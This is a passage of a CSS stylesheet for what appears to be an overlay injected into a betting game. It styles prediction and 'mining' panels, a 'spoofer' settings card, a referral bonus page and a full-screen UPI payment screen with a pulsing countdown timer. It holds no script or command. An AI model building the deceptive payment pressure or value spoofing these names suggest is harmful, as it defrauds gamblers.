    border: 1px solid var(--mine-bdr-h);
    background: var(--mine-lt);
    color: var(--mine);
    cursor: pointer;
    padding: 0;
    transition:
      background 0.15s,
      color 0.15s,
      border-color 0.15s,
      transform 0.15s;
  }
  .mine-hist-btn svg {
    width: 14px;
    height: 14px;
  }
  .mine-hist-btn:hover {
    background: var(--mine);
    color: #fff;
  }
  .mine-hist-btn:active {
    transform: scale(0.97);
    transition-duration: 0.06s;
  }
  .mining-energy-modal {
    position: absolute;
    inset: 0;
    z-index: 100;
    background: rgba(10, 8, 28, 0.88);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 16px;
    padding: 20px;
    box-sizing: border-box;
    animation: modalPop 0.2s cubic-bezier(0.16, 1, 0.3, 1) forwards;
  }
  @keyframes modalPop {
    0% {
      opacity: 0;
      transform: scale(0.97);
    }
    100% {
      opacity: 1;
      transform: scale(1);
    }
  }
  .energy-modal-close {
    position: absolute;
    top: 10px;
    right: 10px;
    width: 28px;
    height: 28px;
    border-radius: 50%;
    background: var(--back-bg);
    border: 1px solid var(--card-bdr);
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: background 0.15s;
    padding: 0;
  }
  .energy-modal-close svg {
    width: 14px;
    height: 14px;
    color: var(--t-dim);
  }
  .energy-modal-close:hover {
    background: var(--strip);
  }
  .energy-modal-content {
    text-align: center;
    max-width: 220px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 8px;
  }
  .energy-modal-icon {
    width: 50px;
    height: 50px;
    border-radius: 14px;
    background: var(--pro-lt);
    border: 1px solid var(--pro-bdr-h);
    display: flex;
    align-items: center;
    justify-content: center;
    color: var(--pro);
  }
  .energy-modal-icon svg {
    width: 28px;
    height: 28px;
  }
  .energy-modal-title {
    font-size: 14px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.2px;
  }
  .energy-modal-desc {
    font-size: 10.5px;
    font-weight: 500;
    color: var(--t-body);
    line-height: 1.5;
  }
  .energy-modal-actions {
    display: flex;
    flex-direction: column;
    gap: 7px;
    width: 100%;
    margin-top: 6px;
  }
  .energy-btn-primary {
    width: 100%;
    padding: 11px;
    border-radius: 11px;
    font-size: 12.5px;
    font-weight: 700;
    cursor: pointer;
    font-family: var(--f);
    border: none;
    background: var(--mine);
    color: #fff;
    box-shadow: 0 2px 12px color-mix(in srgb, var(--mine) 28%, transparent);
    transition:
      transform 0.15s,
      box-shadow 0.15s;
  }
  .energy-btn-primary:hover {
    box-shadow: 0 4px 16px color-mix(in srgb, var(--mine) 38%, transparent);
  }
  .energy-btn-primary:active {
    transform: scale(0.98);
  }
  .energy-btn-secondary {
    width: 100%;
    padding: 10px;
    border-radius: 11px;
    font-size: 11.5px;
    font-weight: 600;
    cursor: pointer;
    font-family: var(--f);
    background: transparent;
    color: var(--t-body);
    border: 1px solid var(--card-bdr);
    transition:
      border-color 0.15s,
      transform 0.15s;
  }
  .energy-btn-secondary:hover {
    border-color: var(--pro-bdr-h);
    color: var(--t-title);
  }
  .energy-btn-secondary:active {
    transform: scale(0.98);
  }
  :host(.light) .mining-energy-modal {
    background: rgba(255, 255, 255, 0.94);
  }
  .console-line {
    line-height: 1.4;
    animation: consoleFade 0.2s cubic-bezier(0.16, 1, 0.3, 1) both;
    letter-spacing: 0.1px;
  }
  @keyframes consoleFade {
    from {
      opacity: 0;
      transform: translateY(3px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
  .mining-history-modal {
    position: absolute;
    inset: 0;
    z-index: 100;
    background: rgba(10, 8, 28, 0.88);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    display: flex;
    flex-direction: column;
    border-radius: 16px;
    padding: 12px;
    box-sizing: border-box;
    animation: modalPop 0.2s cubic-bezier(0.16, 1, 0.3, 1) forwards;
  }
  .history-modal-content {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 7px;
    overflow: hidden;
    padding-top: 18px;
  }
  .history-modal-title {
    font-size: 13px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.15px;
    text-align: center;
  }
  .history-list {
    flex: 1;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 3px;
    scrollbar-width: none;
    padding: 2px 0;
  }
  .history-list::-webkit-scrollbar {
    display: none;
  }
  .history-list:empty::after {
    content: "No mining history yet.";
    display: block;
    text-align: center;
    font-size: 10px;
    color: var(--t-dim);
    padding: 28px 0;
  }
  .hist-entry {
    display: flex;
    align-items: center;
    gap: 7px;
    padding: 7px 9px;
    border-radius: 8px;
    background: var(--back-bg);
    border: 1px solid var(--card-bdr);
    font-size: 9.5px;
    animation: consoleFade 0.18s ease both;
  }
  .hist-entry .hist-side {
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.3px;
    font-size: 8.5px;
    min-width: 28px;
  }
  .hist-entry .hist-side.BigSmall_Big {
    color: var(--big);
  }
  .hist-entry .hist-side.BigSmall_Small {
    color: var(--small);
  }
  .hist-entry .hist-amt {
    flex: 1;
    color: var(--t-body);
    font-variant-numeric: tabular-nums;
  }
  .hist-entry .hist-net {
    font-weight: 800;
    font-variant-numeric: tabular-nums;
    min-width: 48px;
    text-align: right;
  }
  .hist-entry .hist-net.win {
    color: var(--mine);
  }
  .hist-entry .hist-net.loss {
    color: var(--pro);
  }
  .hist-entry .hist-time {
    font-size: 8px;
    color: var(--t-dim);
    min-width: 44px;
    text-align: right;
  }
  .history-clear-btn {
    width: 100%;
    padding: 9px;
    border-radius: 9px;
    border: 1px solid var(--card-bdr);
    background: transparent;
    color: var(--t-dim);
    font-size: 10px;
    font-weight: 600;
    cursor: pointer;
    font-family: var(--f);
    transition:
      border-color 0.15s,
      color 0.15s,
      transform 0.15s;
    flex-shrink: 0;
  }
  .history-clear-btn:hover {
    border-color: var(--pro-bdr-h);
    color: var(--pro);
  }
  .history-clear-btn:active {
    transform: scale(0.98);
  }
  :host(.light) .mining-history-modal {
    background: rgba(255, 255, 255, 0.94);
  }
  @media (min-width: 768px) {
    .panel {
      width: min(90vw, 310px);
    }
    .menu-home-opt {
      padding: 12px 13px;
    }
    .menu-home-name {
      font-size: 13.5px;
    }
  }
  @media (max-width: 320px) {
    .panel {
      width: 94vw;
    }
    .pro-timer {
      font-size: 24px;
    }
    .pred-ball {
      width: 48px;
      height: 48px;
    }
    .pred-size {
      padding: 6px 18px;
      font-size: 13px;
    }
    .pro-card {
      padding: 14px 10px;
      min-height: 112px;
    }
    .pred-hero {
      height: 56px;
    }
    .mine-input {
      width: 55px;
      font-size: 11px;
    }
    .mine-cta {
      padding: 10px;
      font-size: 12px;
    }
    .mining-terminal {
      height: 64px;
    }
  }
  .wg-overlay {
    position: fixed;
    top: 0;
    left: var(--bv-left, 0px);
    width: var(--bv-width, 100%);
    height: 100%;
    background: rgba(0, 0, 0, 0.75);
    z-index: 2005;
  }
  .wg-overlay.inactive {
    display: none;
  }
  .wg-popup {
    position: fixed;
    top: 50%;
    left: calc(var(--bv-left, 0px) + var(--bv-width, 100%) / 2);
    transform: translate(-50%, -50%);
    z-index: 2006;
    width: min(300px, calc(var(--bv-width, 100%) - 32px));
    background: #1e1e3a;
    border-radius: 18px;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    box-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
  }
  .wg-popup.inactive {
    display: none;
  }
  :host(.light) .wg-popup {
    background: #fff;
  }
  .wg-close-x {
    position: absolute;
    top: 10px;
    right: 12px;
    width: 26px;
    height: 26px;
    border-radius: 50%;
    background: rgba(255, 255, 255, 0.1);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 12px;
    color: rgba(255, 255, 255, 0.7);
    cursor: pointer;
    z-index: 1;
  }
  :host(.light) .wg-close-x {
    background: rgba(0, 0, 0, 0.07);
    color: #666;
  }
  .wg-pop-hero {
    text-align: center;
    padding: 28px 20px 14px;
    background: #1e1e3a;
  }
  :host(.light) .wg-pop-hero {
    background: #fff;
  }
  .wg-pop-icon {
    font-size: 44px;
    line-height: 1;
    margin-bottom: 10px;
  }
  .wg-pop-amount {
    font-size: 28px;
    font-weight: 900;
    color: #fff;
    letter-spacing: -0.5px;
    margin-bottom: 8px;
  }
  :host(.light) .wg-pop-amount {
    color: #111;
  }
  .wg-pop-pill {
    display: inline-block;
    padding: 4px 12px;
    border-radius: 99px;
    background: rgba(245, 180, 0, 0.15);
    border: 1px solid rgba(245, 180, 0, 0.35);
    font-size: 10.5px;
    font-weight: 600;
    color: #f5c842;
    letter-spacing: 0.2px;
  }
  :host(.light) .wg-pop-pill {
    background: rgba(249, 89, 89, 0.08);
    border-color: rgba(249, 89, 89, 0.25);
    color: #f95959;
  }
  .wg-pop-stats {
    display: flex;
    gap: 6px;
    padding: 0 16px 12px;
    justify-content: center;
  }
  .wg-stat-chip {
    flex: 1;
    text-align: center;
    padding: 7px 4px;
    border-radius: 10px;
    background: rgba(255, 255, 255, 0.06);
    border: 1px solid rgba(255, 255, 255, 0.1);
    font-size: 10px;
    font-weight: 600;
    color: #c8cad0;
  }
  :host(.light) .wg-stat-chip {
    background: #f5f5ff;
    border-color: #e0e0f0;
    color: #555;
  }
  .wg-pop-body {
    padding: 0 16px 14px;
    font-size: 11.5px;
    color: #7b7e9a;
    line-height: 1.65;
    text-align: center;
  }
  :host(.light) .wg-pop-body {
    color: #777;
  }
  .wg-pop-cta {
    display: block;
    width: calc(100% - 32px);
    margin: 0 16px 10px;
    padding: 14px;
    border-radius: 12px;
    border: none;
    background: linear-gradient(90deg, #f5a623 0%, #f5c842 100%);
    color: #1a1200;
    font-size: 15px;
    font-weight: 800;
    cursor: pointer;
    font-family: inherit;
    letter-spacing: 0.1px;
  }
  :host(.light) .wg-pop-cta {
    background: linear-gradient(90deg, #f95959 0%, #ff8c6e 100%);
    color: #fff;
  }
  .wg-pop-cta:active {
    opacity: 0.9;
  }
  .wg-pop-footer {
    display: flex;
    align-items: center;
    gap: 7px;
    padding: 8px 16px 16px;
    justify-content: center;
  }
  .wg-checkbox {
    width: 17px;
    height: 17px;
    border-radius: 50%;
    border: 1.5px solid #4a4d6a;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    flex-shrink: 0;
    transition:
      background 0.15s,
      border-color 0.15s;
  }
  .wg-checkbox.checked {
    background: #07c160;
    border-color: #07c160;
  }
  .wg-check-tick {
    font-size: 10px;
    color: #fff;
    opacity: 0;
    transition: opacity 0.15s;
  }
  .wg-checkbox.checked .wg-check-tick {
    opacity: 1;
  }
  .wg-no-remind {
    font-size: 11px;
    color: #4a4d6a;
    cursor: pointer;
  }
  :host(.light) .wg-no-remind {
    color: #aaa;
  }
  .bonus-view {
    position: fixed;
    top: 0;
    left: var(--bv-left, 0px);
    width: var(--bv-width, 100%);
    height: 100%;
    z-index: 9999;
    display: none;
    flex-direction: column;
    background: #1a1a2c;
    font-family:
      -apple-system, "system-ui", "Helvetica Neue", Helvetica, "Segoe UI",
      Arial, Roboto, sans-serif;
    color: #c8cad0;
  }
  :host(.light) .bonus-view {
    background: #f7f8ff;
    color: #333;
  }
  .bonus-hdr {
    display: flex;
    align-items: center;
    gap: 0;
    padding: 0 16px;
    height: 49px;
    background: #22224b;
    flex-shrink: 0;
  }
  :host(.light) .bonus-hdr {
    background: linear-gradient(90deg, #f95959 0%, #ff9a8e 100%);
  }
  .bonus-back-btn {
    background: none;
    border: none;
    padding: 0;
    margin-right: 8px;
    cursor: pointer;
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 32px;
    height: 32px;
  }
  .bonus-back-btn svg {
    width: 20px;
    height: 20px;
    fill: none;
    stroke: currentColor;
    stroke-width: 2;
    stroke-linecap: round;
    stroke-linejoin: round;
  }
  .bonus-ttl {
    font-size: 19px;
    font-weight: 400;
    color: #fff;
    flex: 1;
    text-align: center;
    margin-right: 32px;
  }
  .bonus-scroll {
    flex: 1;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch;
  }
  .bonus-hero {
    padding: 24px 20px 16px;
    text-align: center;
  }
  .bonus-hero-icon {
    font-size: 32px;
    margin-bottom: 6px;
  }
  .bonus-h2 {
    font-size: 18px;
    font-weight: 700;
    color: #e8e9f0;
    margin: 0 0 5px;
    line-height: 1.2;
  }
  :host(.light) .bonus-h2 {
    color: #1a1a1a;
  }
  .bonus-sub {
    font-size: 12px;
    color: #8b8ea0;
    line-height: 1.5;
    margin: 0 auto;
    max-width: 240px;
  }
  :host(.light) .bonus-sub {
    color: #666;
  }
  .bonus-stats-row {
    display: flex;
    gap: 6px;
    padding: 0 14px;
    margin-bottom: 10px;
  }
  .bonus-stat {
    flex: 1;
    text-align: center;
    background: #22224b;
    border: 1px solid #2d3060;
    border-radius: 10px;
    padding: 10px 4px;
  }
  :host(.light) .bonus-stat {
    background: #fff;
    border-color: #e8e8e8;
  }
  .bonus-stat-val {
    display: block;
    font-size: 15px;
    font-weight: 700;
    color: #f5c842;
    letter-spacing: -0.2px;
  }
  :host(.light) .bonus-stat-val {
    color: #d97706;
  }
  .bonus-stat-lbl {
    display: block;
    font-size: 9px;
    font-weight: 600;
    color: #5a5d72;
    text-transform: uppercase;
    letter-spacing: 0.3px;
    margin-top: 2px;
  }
  :host(.light) .bonus-stat-lbl {
    color: #999;
  }
  .bonus-prog-card {
    margin: 0 14px 10px;
    background: #22224b;
    border: 1px solid #2d3060;
    border-radius: 10px;
    padding: 11px 12px;
  }
  :host(.light) .bonus-prog-card {
    background: #fff;
    border-color: #e8e8e8;
  }
  .bonus-prog-lbl {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 10px;
    font-weight: 600;
    color: #5a5d72;
    text-transform: uppercase;
    letter-spacing: 0.3px;
    margin-bottom: 7px;
  }
  :host(.light) .bonus-prog-lbl {
    color: #999;
  }
  .bonus-prog-count {
    color: #f5c842;
    font-weight: 700;
  }
  :host(.light) .bonus-prog-count {
    color: #d97706;
  }
  .bonus-bar {
    height: 6px;
    border-radius: 99px;
    background: #2d3060;
    overflow: hidden;
  }
  :host(.light) .bonus-bar {
    background: #eee;
  }
  .bonus-bar-fill {
    height: 100%;
    width: 0%;
    border-radius: 99px;
    background: #f5c842;
    transition: width 0.4s ease;
  }
  :host(.light) .bonus-bar-fill {
    background: #f95959;
  }
  .bonus-section-ttl {
    font-size: 10px;
    font-weight: 700;
    color: #5a5d72;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    margin-bottom: 8px;
  }
  :host(.light) .bonus-section-ttl {
    color: #bbb;
  }
  .bonus-tiers {
    padding: 0 14px;
    margin-bottom: 14px;
  }
  .bonus-tier {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px 12px;
    background: #22224b;
    border: 1px solid #2d3060;
    border-radius: 10px;
    margin-bottom: 5px;
  }
  :host(.light) .bonus-tier {
    background: #fff;
    border-color: #e8e8e8;
  }
  .tier-badge {
    width: 26px;
    height: 26px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 10px;
    font-weight: 700;
    color: #fff;
    flex-shrink: 0;
    background: #3a3d6b;
  }
  :host(.light) .tier-badge {
    background: #ccc;
  }
  .t-bronze {
    background: #a0522d;
  }
  .t-silver {
    background: #8a9bb5;
  }
  .t-gold {
    background: #d97706;
  }
  .t-diamond {
    background: #6d28d9;
  }
  .tier-info {
    flex: 1;
    font-size: 12px;
    color: #7b7e94;
    line-height: 1.5;
  }
  :host(.light) .tier-info {
    color: #666;
  }
  .tier-info b {
    color: #e8e9f0;
    font-weight: 700;
  }
  :host(.light) .tier-info b {
    color: #222;
  }
  .bonus-cta-btn {
    display: block;
    width: calc(100% - 28px);
    margin: 6px 14px 10px;
    padding: 13px;
    border-radius: 10px;
    border: none;
    background: #f5c842;
    color: #1a1a2c;
    font-size: 14px;
    font-weight: 700;
    cursor: pointer;
    font-family: inherit;
    transition: opacity 0.15s;
  }
  :host(.light) .bonus-cta-btn {
    background: #f95959;
    color: #fff;
  }
  .bonus-cta-btn:active {
    opacity: 0.85;
  }
  .bonus-link-preview {
    margin: 0 14px 14px;
    padding: 8px 10px;
    border-radius: 8px;
    background: #22224b;
    border: 1px solid #2d3060;
    font-size: 10px;
    color: #5a5d72;
    word-break: break-all;
    line-height: 1.5;
    font-family: monospace;
  }
  :host(.light) .bonus-link-preview {
    background: #f5f5f5;
    border-color: #e8e8e8;
    color: #999;
  }
  .bonus-rules {
    padding: 0 14px;
    margin-bottom: 14px;
  }
  .bonus-rule {
    font-size: 11px;
    color: #7b7e94;
    line-height: 1.7;
  }
  :host(.light) .bonus-rule {
    color: #666;
  }
  .settings-header-label {
    flex: 1;
    font-size: 13.5px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.2px;
  }
  .spoofer-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    padding: 14px 13px;
    margin-top: 2px;
  }
  .spoofer-section {
    margin-bottom: 14px;
  }
  .spoofer-section:last-of-type {
    margin-bottom: 12px;
  }
  .spoofer-label {
    display: block;
    font-size: 9px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    color: var(--t-dim);
    margin-bottom: 8px;
  }
  .spoofer-row {
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .spoofer-row input[type="range"] {
    flex: 1;
    height: 4px;
    -webkit-appearance: none;
    appearance: none;
    background: var(--strip);
    border-radius: 3px;
    outline: none;
    cursor: pointer;
  }
  .spoofer-row input[type="range"]::-webkit-slider-thumb {
    -webkit-appearance: none;
    width: 14px;
    height: 14px;
    border-radius: 50%;
    background: var(--pro);
    border: 2px solid var(--panel-bg);
    cursor: pointer;
    box-shadow: 0 1px 6px rgba(139, 92, 246, 0.4);
  }
  .spoofer-row input[type="number"] {
    width: 52px;
    padding: 5px 6px;
    border-radius: 8px;
    border: 1px solid var(--card-bdr);
    background: var(--panel-bg);
    color: var(--t-title);
    font-size: 12px;
    font-weight: 700;
    font-family: var(--f);
    text-align: center;
    outline: none;
    -webkit-appearance: none;
    appearance: none;
    -moz-appearance: textfield;
  }
  .spoofer-row input[type="number"]::-webkit-inner-spin-button,
  .spoofer-row input[type="number"]::-webkit-outer-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }
  .spoofer-row input[type="number"]:focus {
    border-color: var(--pro);
  }
  .spoofer-unit {
    font-size: 11px;
    font-weight: 700;
    color: var(--t-dim);
    min-width: 14px;
  }
  .spoofer-reset {
    display: block;
    width: 100%;
    padding: 8px;
    border-radius: 8px;
    border: 1px solid var(--card-bdr);
    background: transparent;
    color: var(--t-dim);
    font-size: 10.5px;
    font-weight: 600;
    cursor: pointer;
    font-family: var(--f);
    transition: all 0.15s;
    letter-spacing: 0.2px;
    -webkit-appearance: none;
    appearance: none;
  }
  .spoofer-reset:hover {
    border-color: var(--pro);
    color: var(--pro);
  }
  .spoofer-reset:active {
    transform: scale(0.97);
  }
  .pay-overlay {
    position: fixed;
    top: 0;
    left: var(--bv-left, 0px);
    width: var(--bv-width, 100%);
    height: 100vh;
    height: 100dvh;
    background: #1a1a2c;
    z-index: 99999;
    font-family: var(--f, system-ui, -apple-system, sans-serif);
    color: #c8cad0;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    box-sizing: border-box;
    max-width: 100vw;
  }
  :host(.light) .pay-overlay {
    background: #fdfdfd;
    color: #1a1b25;
  }
  .pay-hdr {
    display: flex;
    align-items: center;
    justify-content: space-between;
    height: 56px;
    padding: 0 20px;
    flex-shrink: 0;
    background: #22224b;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    position: relative;
    z-index: 10;
  }
  :host(.light) .pay-hdr {
    background: #fff;
    border-bottom: 1px solid rgba(0, 0, 0, 0.04);
  }
  .pay-back {
    background: none;
    border: none;
    padding: 0;
    cursor: pointer;
    color: #fff;
    width: 32px;
    height: 32px;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    transition:
      transform 0.2s ease,
      opacity 0.2s ease;
  }
  .pay-back:active {
    transform: translateX(-2px);
    opacity: 0.7;
  }
  :host(.light) .pay-back {
    color: #1a1b25;
  }
  .pay-back svg {
    width: 22px;
    height: 22px;
    stroke-width: 2.5;
  }
  .pay-ttl {
    font-size: 16px;
    font-weight: 700;
    color: #fff;
    letter-spacing: 0;
  }
  :host(.light) .pay-ttl {
    color: #111;
  }
  .pay-body {
    flex: 1;
    overflow-y: auto;
    overflow-x: hidden;
    -webkit-overflow-scrolling: touch;
    padding-bottom: 34px;
  }
  .pay-content {
    padding-top: 0;
  }
  @keyframes slideUp {
    from {
      opacity: 0;
      transform: translateY(16px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
  .pay-anim {
    animation: slideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) backwards;
  }
  .pay-anim-1 {
    animation-delay: 0.05s;
  }
  .pay-anim-2 {
    animation-delay: 0.1s;
  }
  .pay-anim-3 {
    animation-delay: 0.15s;
  }
  .pay-anim-4 {
    animation-delay: 0.2s;
  }
  .pay-hero {
    position: relative;
    min-height: 148px;
    padding: 22px 20px 34px;
    overflow: hidden;
    background: linear-gradient(
      90deg,
      #fb8466 0%,
      #bd5bd4 33%,
      #7473fa 66%,
      #53b2fa 100%
    );
  }
  :host(.light) .pay-hero {
    background: linear-gradient(90deg, #ff6b6b 0%, #ff9b9b 52%, #fff2f2 100%);
  }
  .pay-hero::after {
    content: "";
    position: absolute;
    inset: auto 0 0;
    height: 46px;
    background: linear-gradient(to bottom, rgba(26, 26, 44, 0), #1a1a2c 82%);
  }
  :host(.light) .pay-hero::after {
    background: linear-gradient(to bottom, rgba(253, 253, 253, 0), #fdfdfd 82%);
  }
  .pay-hero-top {
    position: relative;
    z-index: 1;
    display: flex;
    align-items: flex-start;
    justify-content: space-between;
    gap: 14px;
  }
  .pay-hero-label {
    display: block;
    color: rgba(255, 255, 255, 0.72);
    font-size: 12px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    margin-bottom: 7px;
  }
  .pay-hero-sub {
    position: relative;
    z-index: 1;
    margin-top: 10px;
    color: rgba(255, 255, 255, 0.82);
    font-size: 13px;
    font-weight: 600;
  }
  .pay-amount-box {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 32px 20px 24px;
    position: relative;
  }
  .pay-amount-bg {
    position: absolute;
    top: -70px;
    right: -40px;
    width: 210px;
    height: 150px;
    background: rgba(255, 255, 255, 0.26);
    filter: blur(48px);
    opacity: 0.6;
    border-radius: 50%;
    z-index: 0;
  }
  :host(.light) .pay-amount-bg {
    background: linear-gradient(90deg, #f95959, #ff8080);
    filter: blur(50px);
    opacity: 0.1;
  }
  .pay-timer-pill {
    display: flex;
    align-items: center;
    gap: 6px;
    position: relative;
    z-index: 1;
    background: rgba(34, 34, 75, 0.28);
    border: 1px solid rgba(255, 255, 255, 0.25);
    padding: 7px 12px;
    border-radius: 20px;
    flex-shrink: 0;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.16);
  }
  :host(.light) .pay-timer-pill {
    background: #fff;
    border-color: rgba(0, 0, 0, 0.05);
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
  }
  .pay-timer-pill.urgent {
    background: rgba(239, 68, 68, 0.1);
    border-color: rgba(239, 68, 68, 0.2);
    animation: timerShake 0.45s ease infinite;
  }
  .pay-clock {
    width: 14px;
    height: 14px;
    color: #fff;
    flex-shrink: 0;
  }
  :host(.light) .pay-clock {
    color: #f95959;
  }
  .pay-timer-pill.urgent .pay-clock {
    color: #ef4444;
  }
  .pay-timer-txt {
    font-weight: 800;
    color: #fff;
    font-size: 14px;
    font-variant-numeric: tabular-nums;
    letter-spacing: 0.5px;
  }
  :host(.light) .pay-timer-txt {
    color: #f95959;
  }
  .pay-timer-pill.urgent .pay-timer-txt {
    color: #ef4444;
  }
  .pay-amt {
    display: block;
    position: relative;
    z-index: 1;
    font-size: 44px;
    font-weight: 900;
    color: #fff;
    letter-spacing: 0;
    line-height: 0.98;
    text-shadow: 0 8px 24px rgba(0, 0, 0, 0.22);
  }
  :host(.light) .pay-amt {
    color: #fff;
    text-shadow: 0 8px 22px rgba(249, 89, 89, 0.18);
  }
  .pay-section {
    padding: 0 20px;
    margin-bottom: 16px;
  }
  .pay-section-hdr {
    font-size: 12px;
    font-weight: 800;
    color: #8b8ea0;
    margin-bottom: 10px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }
  :host(.light) .pay-section-hdr {
    color: #888;
  }
  .pay-qr-card {
    margin-top: -24px;
    position: relative;
    z-index: 2;
  }
  .pay-method-card,
  .pay-form-card {
    position: relative;
    z-index: 1;
  }
  .pay-qr-wrapper {
    background: #22224b;
    border-radius: 22px;
    padding: 18px 18px 16px;
    display: flex;
    flex-direction: column;
    align-items: center;
    border: 1px solid rgba(255, 255, 255, 0.07);
    box-shadow:
      0 14px 34px rgba(0, 0, 0, 0.24),
      inset 0 1px 0 rgba(255, 255, 255, 0.04);
  }
  :host(.light) .pay-qr-wrapper {
    background: #fff;
    border-color: rgba(0, 0, 0, 0.04);
    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.04);
  }
  .pay-qr-box {
    background: #fff;
    border-radius: 18px;
    padding: 10px;
    margin-bottom: 12px;
    box-shadow:
      0 7px 24px rgba(0, 0, 0, 0.16),
      0 0 0 1px rgba(0, 0, 0, 0.05);
    position: relative;
  }
  .pay-qr {
    width: 172px;
    height: 172px;
    display: block;
    border-radius: 10px;
    opacity: 0;
    transition: opacity 0.4s ease;
    position: relative;
    z-index: 2;
  }
  .pay-qr.loaded {
    opacity: 1;
  }
  .pay-qr-skeleton {
    position: absolute;
    inset: 10px;
    border-radius: 10px;
    background: rgba(0, 0, 0, 0.03);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 1;
  }
  .pay-qr-skeleton svg {
    width: 28px;
    height: 28px;
    animation: paySpin 1s linear infinite;
    color: #8b8ea0;
  }
  @keyframes paySpin {
    100% {
      transform: rotate(360deg);
    }
  }
  .pay-scan-text {
    font-size: 13px;
    color: #b8bbcf;
    font-weight: 700;
    text-align: center;
    line-height: 1.5;
  }
  :host(.light) .pay-scan-text {
    color: #666;
  }
  .pay-upi-row {
    display: flex;
    align-items: center;
    gap: 12px;
    background: #22224b;
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 16px;
    padding: 13px 14px;
    transition:
      background 0.2s,
      border-color 0.2s;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.03);
  }
  .pay-upi-row:active {
    background: rgba(255, 255, 255, 0.05);
  }
  :host(.light) .pay-upi-row {
    background: #fafafa;
    border-color: rgba(0, 0, 0, 0.06);
  }
  :host(.light) .pay-upi-row:active {
    background: #f5f5f5;
    border-color: #f95959;
  }
  .pay-upi-info {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 3px;
    min-width: 0;
  }
  .pay-upi-lbl {
    font-size: 11px;
    color: #8b8ea0;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.4px;
  }
  :host(.light) .pay-upi-lbl {
    color: #999;
  }
  .pay-upi-id {
    font-size: 16px;
    font-weight: 800;
    color: #fff;
    letter-spacing: 0;
    font-family: var(--f, system-ui, -apple-system, sans-serif);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  :host(.light) .pay-upi-id {
    color: #111;
  }
  .pay-upi-actions {
    display: flex;
    gap: 8px;
    align-items: center;
  }
  .pay-copy-btn {
    background: rgba(160, 143, 255, 0.16);
    color: #fff;
    border: 1px solid rgba(160, 143, 255, 0.18);
    padding: 9px 15px;
    border-radius: 12px;
    font-size: 12px;
    font-weight: 800;
    cursor: pointer;
    transition: all 0.2s ease;
  }
  :host(.light) .pay-copy-btn {
    background: rgba(249, 89, 89, 0.08);
    color: #f95959;
  }
  .pay-copy-btn:hover {
    background: rgba(160, 143, 255, 0.22);
  }
  .pay-copy-btn:active {
    transform: scale(0.95);
  }
  .pay-copy-btn.copied {
    background: #22c55e !important;
    color: #fff !important;
  }
  .pay-route-card {
    width: 100%;
    margin-top: 10px;
    padding: 11px 12px;
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 16px;
    background: #22224b;
    color: #fff;
    display: flex;
    align-items: center;
    gap: 11px;
    position: relative;
    overflow: hidden;
    cursor: pointer;
    text-align: left;
    box-shadow:
      inset 3px 0 0 #a08fff,
      inset 0 1px 0 rgba(255, 255, 255, 0.04);
    font-family: var(--f, system-ui, -apple-system, sans-serif);
    transition:
      transform 0.18s ease,
      border-color 0.18s ease,
      background 0.18s ease;
  }
  .pay-route-card:active {
    transform: scale(0.985);
    border-color: rgba(160, 143, 255, 0.38);
    background: #292958;
  }
  .pay-route-index {
    flex: 0 0 auto;
    min-width: 48px;
    padding: 8px 9px;
    border-radius: 12px;
    text-align: center;
    color: #fff;
    font-size: 12px;
    font-weight: 900;
    background: linear-gradient(90deg, #fb8466, #bd5bd4, #7473fa, #53b2fa);
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.18);
  }
  .pay-route-copy {
    position: relative;
    z-index: 1;
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 2px;
    min-width: 0;
  }
  .pay-route-title {
    font-size: 12.5px;
    font-weight: 800;
    color: #fff;
    letter-spacing: 0;
    line-height: 1.2;
  }
  .pay-route-sub {
    font-size: 11px;
    font-weight: 600;
    color: #b9bdd6;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .pay-route-icon {
    position: relative;
    z-index: 1;
    width: 32px;
    height: 32px;
    flex: 0 0 32px;
    border-radius: 50%;
    display: flex;
    align-items: center;
